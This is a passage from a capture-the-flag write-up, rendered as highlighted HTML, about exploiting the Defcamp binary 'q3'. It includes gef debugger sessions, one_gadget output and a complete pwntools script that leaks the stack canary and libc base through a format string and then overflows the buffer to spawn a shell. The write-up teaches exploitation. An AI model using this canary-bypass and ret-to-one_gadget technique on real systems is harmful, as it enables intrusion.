+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffff7ffe000</span> <span class="mi">0x00007ffff7fff000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">0x00007ffffffde000</span> <span class="mi">0x00007ffffffff000</span> <span class="mi">0x0000000000000000</span> <span class="no">rw-</span> <span class="p">[</span><span class="no">stack</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">xffffffffff600000</span> <span class="mi">0xffffffffff601000</span> <span class="mi">0x0000000000000000</span> <span class="no">r-x</span> <span class="p">[</span><span class="no">vsyscall</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0x7ffff7af4154</span> <span class="p">-</span> <span class="mi">0x00007ffff79e4000</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="mi">0x110154</span>
+</span></span></code></pre></div><p>Using <code>vmmap</code> we get to know the address of executable and writable libc and using the address we leaked from <code>%3$lx</code> input we have the leaked libc address, we just subtracted the leak address from the <code>libc.so.6</code> address, we get the offset.</p>
+<p>Time to find out the offsets for register so we we will create our final exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x81e</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">create</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Generating</span> <span class="no">a</span> <span class="no">pattern</span> <span class="no">of</span> <span class="mi">100</span> <span class="no">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="nf">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Saved</span> <span class="no">as</span> <span class="err">&#39;</span><span class="no">$_gef0</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span> 
+</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">name</span> <span class="p">:</span> <span class="no">AAAA</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Hello</span>
+</span></span><span class="line"><span class="cl"><span class="nf">AAAA</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Enter</span> <span class="no">sentence</span> <span class="p">:</span> <span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rax</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$rbx</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$rcx</span>   <span class="p">:</span> <span class="mi">0x6161616161616164</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">daaaaaaa</span><span class="err">&#34;?</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rdx</span>   <span class="p">:</span> <span class="mi">0x00007ffff7dd18d0</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rsp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd10</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rbp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd40</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rsi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd20</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rdi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd21</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$rip</span>   <span class="p">:</span> <span class="mi">0x000055555555481e</span>  <span class="err">→</span>  <span class="mi">0x000028250c334864</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">dH3</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="err">%(&#34;?)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r8</span>    <span class="p">:</span> <span class="mi">0x00005555557566d5</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r9</span>    <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r10</span>   <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r11</span>   <span class="p">:</span> <span class="mi">0x246</span>             
+</span></span><span class="line"><span class="cl"><span class="no">$r12</span>   <span class="p">:</span> <span class="mi">0x0000555555554670</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_start</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r13</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde20</span>  <span class="err">→</span>  <span class="mi">0x0000000000000001</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$r14</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$r15</span>   <span class="p">:</span> <span class="mi">0x0</span>               
+</span></span><span class="line"><span class="cl"><span class="no">$eflags</span><span class="p">:</span> <span class="p">[</span><span class="no">ZERO</span> <span class="no">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nl">$cs:</span> <span class="err">0</span><span class="nf">x0033</span> <span class="no">$ss</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$ds</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$es</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$fs</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$gs</span><span class="p">:</span> <span class="mi">0x0000</span> 
+</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">stack</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd10</span><span class="err">│+</span><span class="mi">0x0000</span><span class="p">:</span> <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>	 <span class="err">←</span> <span class="no">$rsp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd18</span><span class="err">│+</span><span class="mi">0x0008</span><span class="p">:</span> <span class="mi">0x00007ffff7dcfa00</span>  <span class="err">→</span>  <span class="mi">0x00000000fbad2288</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd20</span><span class="err">│+</span><span class="mi">0x0010</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga</span><span class="p">[...]</span><span class="err">&#34;</span>	 <span class="err">←</span> <span class="no">$rsi</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd28</span><span class="err">│+</span><span class="mi">0x0018</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd30</span><span class="err">│+</span><span class="mi">0x0020</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd38</span><span class="err">│+</span><span class="mi">0x0028</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd40</span><span class="err">│+</span><span class="mi">0x0030</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span><span class="p">[...]</span><span class="err">&#34;</span>	 <span class="err">←</span> <span class="no">$rbp</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd48</span><span class="err">│+</span><span class="mi">0x0038</span><span class="p">:</span> <span class="err">&#34;</span><span class="no">faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala</span><span class="p">[...]</span><span class="err">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nl">code:x86:</span><span class="err">64</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554810</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">150</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554815</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">155</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0x0</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555481a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">160</span><span class="err">&gt;</span>       <span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"> <span class="err">→</span> <span class="err">0</span><span class="nf">x55555555481e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span><span class="err">&gt;</span>       <span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554827</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">173</span><span class="err">&gt;</span>       <span class="no">je</span>     <span class="mh">0x55555555482e</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">180</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x555555554829</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">175</span><span class="err">&gt;</span>       <span class="no">call</span>   <span class="mh">0x555555554630</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x55555555482e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">180</span><span class="err">&gt;</span>       <span class="no">leave</span>  
+</span></span><span class="line"><span class="cl">   <span class="mh">0x55555555482f</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">181</span><span class="p">&gt;</span>       <span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">   <span class="mh">0x555555554830</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">0</span><span class="p">&gt;</span> <span class="no">push</span>   <span class="no">r15</span>
+</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;q3&#34;, stopped, reason: BREAKPOINT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x55555555481e → main()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0x000055555555481e</span> <span class="no">in</span> <span class="no">main</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="no">daaaaaaa</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">daaaaaaa</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">17</span> <span class="p">(</span><span class="no">little-endian</span> <span class="no">search</span><span class="p">)</span> <span class="no">likely</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">24</span> <span class="p">(</span><span class="no">big-endian</span> <span class="no">search</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">pattern</span> <span class="no">search</span> <span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Found</span> <span class="no">at</span> <span class="no">offset</span> <span class="mi">32</span> <span class="p">(</span><span class="no">big-endian</span> <span class="no">search</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="no">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="no">$rcx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">$1</span> <span class="err">=</span> <span class="mi">0x6161616161616164</span>   <span class="err">&lt;</span><span class="p">---</span> <span class="no">Canary</span> <span class="no">value</span> <span class="no">overwrtten</span>
+</span></span></code></pre></div><p>As you can see we have overwritten the canary and we have the <code>rcx</code> register offset and we have <code>rbp</code> register offset at 32 which would be <code>32 - 24 = 8</code>.</p>
+<h3 id="one_gadget---the-best-tool-for-finding-one-gadget-rce-in-libcso6" class="relative group">One_gadget - The best tool for finding one gadget RCE in libc.so.6 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#one_gadget---the-best-tool-for-finding-one-gadget-rce-in-libcso6" aria-label="Anchor">#</a></span></h3><p>I can honsetly vouch for this tool, this was the first time I used it and it&rsquo;s just awesome. With this tool it was easier to find the gadgets for shell spwaning.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">ldd</span> <span class="no">q3</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">linux-vdso.so.1</span> <span class="p">(</span><span class="mi">0x00007ffff7ffa000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">libc.so.6</span> <span class="err">=&gt;</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6</span> <span class="p">(</span><span class="mi">0x00007ffff77e2000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="err">/</span><span class="nf">lib64</span><span class="err">/</span><span class="no">ld-linux-x86-64.so.2</span> <span class="p">(</span><span class="mi">0x00007ffff7dd5000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">one_gadget</span> <span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x4f2c5</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">rcx</span> <span class="err">==</span> <span class="no">NULL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x4f322</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">[</span><span class="nf">rsp</span><span class="err">+</span><span class="mi">0x40</span><span class="p">]</span> <span class="err">==</span> <span class="no">NULL</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x10a38c</span> <span class="no">execve</span><span class="p">(</span><span class="err">&#34;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span><span class="p">,</span> <span class="no">rsp</span><span class="err">+</span><span class="mi">0x70</span><span class="p">,</span> <span class="no">environ</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nl">constraints:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">[</span><span class="nf">rsp</span><span class="err">+</span><span class="mi">0x70</span><span class="p">]</span> <span class="err">==</span> <span class="no">NULL</span>
+</span></span></code></pre></div><p>I&rsquo;ll be using the first one <code>0x4f2c5</code>. Now, it&rsquo;s time to pwn:-</p>
+<h3 id="final-exploit" class="relative group">Final Exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#final-exploit" aria-label="Anchor">#</a></span></h3><p>We have almost everything, now it&rsquo;s time for final exploit:-</p>
+<p>Here&rsquo;s the idea, I&rsquo;ll be using the format string specifier to leak canary and libc address and then use the stack canary value to send the payload and using the libc address offset we will get the one_gadget address and we are done.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># stack canary is at offset 11 for format string</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># It is at offset 24 for buffer overflow</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BINARY</span> <span class="o">=</span> <span class="s1">&#39;./q3&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./q3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak stack canary (offset 11) and the libc address (offset 3)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%11$lx-%3$lx&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaks</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">stack_canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># Stack Canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x110154</span>  <span class="c1"># LIBC offset we found earlier </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;canary: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f2c5</span> <span class="c1"># using one_gadget </span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;one_gadget: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">24</span> <span class="c1"># Write up to the stack canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_canary</span><span class="p">)</span> <span class="c1"># Ensure we don&#39;t change the stack canary</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="c1"># Overwrite RBP to reach upto RIP</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="c1"># Overwrite RIP with pre-made shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Running the exploit we will get shell:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">robin@oracle:</span><span class="err">~/</span><span class="nf">CTFs</span><span class="err">/</span><span class="no">Defcamp$</span> <span class="no">python</span> <span class="no">q3_exp.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Full</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
